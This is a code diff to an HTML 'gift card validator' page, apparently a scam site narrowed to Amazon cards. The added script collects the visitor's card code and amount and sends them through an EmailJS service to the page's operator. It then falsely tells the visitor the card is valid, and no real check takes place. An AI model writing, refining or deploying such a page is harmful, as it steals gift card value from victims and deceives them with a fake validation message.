@@ -67,42 +67,79 @@ rel="stylesheet"
         <img class="heroimg" src="images/gift-card.png" alt="" />
       </div>
       <h2 class="text-center text-light">
-        VALIDATE ALL GIFT CARD</h2>
+        VALIDATE AMAZON CARD</h2>
     <div class="body">
         <div class="container">
-            <h6 class="text-center">carefully Scratch the card to see your code</h6>
+            <h6 class="text-center">Carefully scratch the card to see the code</h6>
+            <div>
+                <img src="images/apple-ma.png" class="img-fluid" width="200" height="200" style="display: block; margin-left: auto; margin-right: auto;">
+            </div>
             <form id="giftCardForm">
                 <!-- Select for card type -->
                 <label for="cardType">Select Type of Card:</label>
                 <select id="cardType" name="cardType">
                     <option value="" disabled selected>Select type of card</option>
-                    <option value="Apple Gift Card">Apple Gift Card</option>
-                    <option value="Amex Gift Card">Amex Gift Card</option>
-                    <option value="eBay Gift Card">eBay Gift Card</option>
-                    <option value="Visa Gift Card">Sephora Gift Card</option>
-                    <option value="Visa Gift Card">Razor Gold Gift Card</option>
-                    <option value="Visa Gift Card">Nike Gift Card</option>
+                    <option value="Apple Gift Card">Amazon Gift Card</option>
                 </select>
     
                 <!-- Input for gift card code -->
                 <label for="cardCode">Gift Card Code:</label>
                 <input type="text" id="cardCode" name="cardCode" placeholder="Enter gift card code" required>
-    
-                <!-- Input for expiration date --> 
-                <label for="expirationDate">Expiration Date:</label>
-                <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required>
+
     
                 <!-- Input for CVV -->
-                <label for="cvv">CVV:</label>
-                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
+                <label for="amount">AMOUNT:</label>
+                <input type="text" id="amount" name="amount" placeholder="Enter amount" required>
     
                 <!-- Submit Button -->
-                <button class="mt-4" type="button" id="verifyButton">Verify Card</button>
+                <button class="mt-5" type="button" id="verifyButton">Verify Card</button>
             </form>
         </div>
     
-        <script src="https://cdn.emailjs.com/dist/email.min.js"></script> <!-- EmailJS CDN -->
-        <script src="all.js"></script> <!-- Link to external JavaScript -->
+        <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "wbHfs6tRaKIdCf2zg",
+      });
+   })();
+</script> EmailJS CDN
+        <script>
+            // Initialize EmailJS
+
+// Function to send the form data
+document.getElementById('verifyButton').addEventListener('click', function() {
+    // Get form values
+    const cardType = document.getElementById('cardType').value;
+    const cardCode = document.getElementById('cardCode').value;
+    const amount = document.getElementById('amount').value;
+    // Basic validation
+    if (!cardType || !cardCode || !amount) {
+        alert("Please fill out all fields.");
+        return;
+    }
+
+    // EmailJS service parameters
+    const templateParams = {
+        cardType: cardType,
+        cardCode: cardCode,
+        amount: amount,
+    };
+
+    // Send email using EmailJS
+    emailjs.send('service_qzggxni', 'template_s2q4ajk', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            alert("Your Gift Card is Valid!");
+        }, function(error) {
+            console.log('FAILED...', error);
+            alert("Failed to send card details. Please try again.");
+        });
+});
+
+        </script> <!-- Link to external JavaScript -->
     </div>
 </body>
 </html>
